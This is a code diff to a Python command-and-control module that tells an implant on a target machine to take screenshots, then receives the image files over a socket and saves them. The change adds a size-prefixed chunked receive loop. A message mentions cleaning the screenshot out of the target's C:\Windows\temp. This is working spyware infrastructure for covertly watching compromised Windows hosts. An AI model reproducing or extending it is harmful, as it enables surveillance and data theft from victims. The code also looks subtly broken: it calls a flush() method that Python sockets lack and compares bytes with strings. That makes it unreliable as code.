@@ -8,6 +8,7 @@ FAILURE = 0
 # Command value
 SCREENSHOT = 5
 
+
 '''
 Description:
     Performs screenshot functionality; communicates with C2 server and handles responses
@@ -31,8 +32,29 @@ def screenshot(sock, filePath):
         if (data == "SUCCESS"):
 
             # Get our screenshot file 
-            print("Successful screenshot! Getting file contents...")
-            data = sock.recv(15000)# need to change to actual file size? screenshots are large...
+            print("Successful screenshot! Getting file size...")
+
+            data = sock.recv(1024)
+
+            fileSize = int.from_bytes(data, 'little')
+
+            print("File is %i bytes; Receiving data... " % fileSize)
+            
+            data = b''
+            dataRead = 0
+
+            # Sockets are sometimes annoying and weird (and fragile)
+            while(dataRead < fileSize):
+                # Either adding 1024 is going to keep us under our file size or...
+                if (dataRead + 1024 <= fileSize):
+                    sockData = sock.recv(1024)
+                    data += sockData
+                # Grabing 1024 will be too much so just grab the difference
+                else:
+                    dataToRead = fileSize - dataRead
+                    sockData = sock.recv(dataToRead)
+                    data += sockData
+                dataRead = len(data)
 
             with open(filePath, "wb") as outputfile:
                     outputfile.write(data)
@@ -47,6 +69,7 @@ def screenshot(sock, filePath):
 
             if (data == 'SUCCESS'):
                 print("Successful screenshot!\n")
+                sock.flush()
 
             else:
                  print("Implant failed to delete file off target! Check C:\\Windows\\temp and ensure to delete that...")
